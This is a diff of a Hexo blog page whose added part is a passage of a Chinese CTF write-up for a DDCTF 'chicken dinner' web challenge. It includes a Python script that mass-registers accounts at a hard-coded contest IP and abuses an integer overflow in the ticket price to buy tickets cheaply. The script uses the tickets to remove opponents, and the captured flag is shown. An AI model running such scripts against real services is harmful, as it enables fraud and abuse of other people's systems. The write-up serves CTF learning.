+<p>&#x63D0;&#x4EA4;&#xFF0C;&#x7136;&#x540E;&#x652F;&#x4ED8;&#xFF0C;&#x8D2D;&#x4E70;&#x6210;&#x529F;&#x5E76;&#x4E14;&#x53EA;&#x82B1;&#x4E86;&#x4E00;&#x5143;&#x94B1;&#x3002;</p>
+<p>&#x5728;&#x6E38;&#x620F;&#x91CC;&#x9762;&#x63D0;&#x793A;&#xFF1A;&#x901A;&#x8FC7;&#x63D0;&#x4EA4;&#x6B63;&#x786E;id&#x4E0E;ticket&#x6765;&#x79FB;&#x9664;&#x5BF9;&#x624B;</p>
+<p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x5199;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x6279;&#x91CF;&#x6CE8;&#x518C;&#xFF0C;&#x8D2D;&#x4E70;&#x5165;&#x573A;&#x7968;&#xFF0C;&#x83B7;&#x5F97;ID&#x548C;ticket&#x3002;&#x7136;&#x540E;&#x7528;&#x8FD9;&#x4E2A;&#x8D26;&#x6237;&#x6765;&#x79FB;&#x9664;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x501F;&#x7528;&#x4E00;&#x4E2A;&#x5927;&#x4F6C;&#x7684;&#x811A;&#x672C;&#xFF1A;</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> json</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> random</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line">X = requests.Session()</span><br><span class="line">X.get(<span class="hljs-string">&quot;http://117.51.147.155:5050/ctf/api/register?name=admintest4&amp;password=admintest&quot;</span>)</span><br><span class="line">cnt = <span class="hljs-number">0</span></span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):</span><br><span class="line">    i+=<span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-comment"># time.sleep(0.1)</span></span><br><span class="line">    R = requests.Session()</span><br><span class="line">    <span class="hljs-comment"># reg</span></span><br><span class="line">    reg_res = R.get(<span class="hljs-string">&quot;http://117.51.147.155:5050/ctf/api/register?name=Sndav0{}&amp;password=12345678&quot;</span>.format(i))</span><br><span class="line">    <span class="hljs-comment"># if &quot;200&quot; in reg_res.text:</span></span><br><span class="line">    <span class="hljs-comment">#     # print(&quot;Sndav{} is registed pass:12345678&quot;.format(i));</span></span><br><span class="line">    buy_res = R.get(<span class="hljs-string">&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967299&quot;</span>)    </span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        bill_id = json.loads(buy_res.text)</span><br><span class="line">        bill_id = bill_id[<span class="hljs-string">&apos;data&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;bill_id&apos;</span>]</span><br><span class="line">        <span class="hljs-comment"># print(&quot;billid:&quot;+bill_id);</span></span><br><span class="line">        buy2_res = R.get(<span class="hljs-string">&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={}&quot;</span>.format(bill_id))</span><br><span class="line">        <span class="hljs-comment"># print(json.loads(buy2_res.text)[u&apos;code&apos;])</span></span><br><span class="line">        <span class="hljs-comment"># get_token</span></span><br><span class="line">        token_res = R.get(<span class="hljs-string">&quot;http://117.51.147.155:5050/ctf/api/search_ticket&quot;</span>)</span><br><span class="line">        js = json.loads(token_res.text)[<span class="hljs-string">&apos;data&apos;</span>][<span class="hljs-number">0</span>]</span><br><span class="line">        <span class="hljs-comment"># print(js)</span></span><br><span class="line">        id = js[<span class="hljs-string">&apos;id&apos;</span>]</span><br><span class="line">        ticket = js[<span class="hljs-string">&apos;ticket&apos;</span>]</span><br><span class="line">        print(id,ticket)</span><br><span class="line">        X.get(<span class="hljs-string">&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id={}&amp;ticket={}&quot;</span>.format(id,ticket))</span><br><span class="line">        print(X.get(<span class="hljs-string">&quot;http://117.51.147.155:5050/ctf/api/get_flag&quot;</span>).text)</span><br><span class="line">        cnt+=<span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">except</span>:</span><br><span class="line">        <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x76F4;&#x63A5;&#x8DD1;&#xFF0C;&#x8FD4;&#x56DE;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">141 c8f034432be513ace9e8452f8af78d89</span><br><span class="line">{&quot;code&quot;:200,&quot;data&quot;:[&quot;DDCTF{chiken_dinner_hyMCX[n47Fx)}&quot;],&quot;msg&quot;:&quot;\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21&quot;}</span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x9898;&#x7684;&#x6536;&#x83B7;&#x5E94;&#x8BE5;&#x662F;&#x4E86;&#x89E3;&#x4E86;&#x6574;&#x6570;&#x6EA2;&#x51FA;&#xFF0C;&#x540E;&#x9762;&#x4E5F;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002;</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Writeup/">#Writeup</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/04/27/2019全国大学生信息安全竞赛WEB1_Writeuo/">2019全国大学生信息安全竞赛反序列化题目复现</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/04/16/Upload-labs-Writeup/">Upload-labs-Writeup</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
 
     </div>
-
-    
-    
-    
-        
-      
-
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
-            
-          </div>
-        
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/04/16/Upload-labs-Writeup/" rel="next" title="Upload-labs-Writeup">
-                  <i class="fa fa-chevron-left"></i> Upload-labs-Writeup
-                </a>
-              
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
             </div>
+            <div class="column is-hidden-mobile"></div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/04/27/2019全国大学生信息安全竞赛WEB1_Writeuo/" rel="prev" title="2019全国大学生信息安全竞赛反序列化题目复现">
-                  2019全国大学生信息安全竞赛反序列化题目复现 <i class="fa fa-chevron-right"></i>
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
                 </a>
-              
+                
+                </div>
             </div>
-          </div>
-        
-      </footer>
-    
-  </div>
-  
-  
-  
-  </article>
-
-  </div>
-
-
-          </div>
-          
-
+            
+            
         </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-  </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
-          Inhaltsverzeichnis
-        </li>
-        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-          Übersicht
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-滴"><span class="nav-number">1.</span> <span class="nav-text">Web - 滴~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-WEB签到题"><span class="nav-number">2.</span> <span class="nav-text">Web - WEB签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Upload-IMG"><span class="nav-number">3.</span> <span class="nav-text">Web - Upload-IMG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-复现-大吉大利-今晚吃鸡"><span class="nav-number">4.</span> <span class="nav-text">Web - 复现 - 大吉大利,今晚吃鸡~</span></a></li></ol></div>
-          </div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Threezh1</p>
-  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
-  <nav class="site-state motion-element">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">34</span>
-          <span class="site-state-item-name">Artikel</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">Kategorien</span>
-        
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">21</span>
-        <span class="site-state-item-name">schlagwörter</span>
-        
-      </div>
-    
-  </nav>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-    
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
-      </span>
-    
-  </div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
 
 
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
 
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Escribe algo...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-      </div>
-
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Threezh1</span>
 </div>
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Tags',
+                UNTITLED: '(Sin título)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-  </div>
-
-  
-  <script src="/lib/jquery/index.js?v=3.4.1"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
-<script src="/js/schemes/pisces.js?v=7.3.0"></script>
-<script src="/js/next-boot.js?v=7.3.0"></script>
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-
-  
-  <script src="/js/post-details.js?v=7.3.0"></script>
-
-
 </body>
 </html>
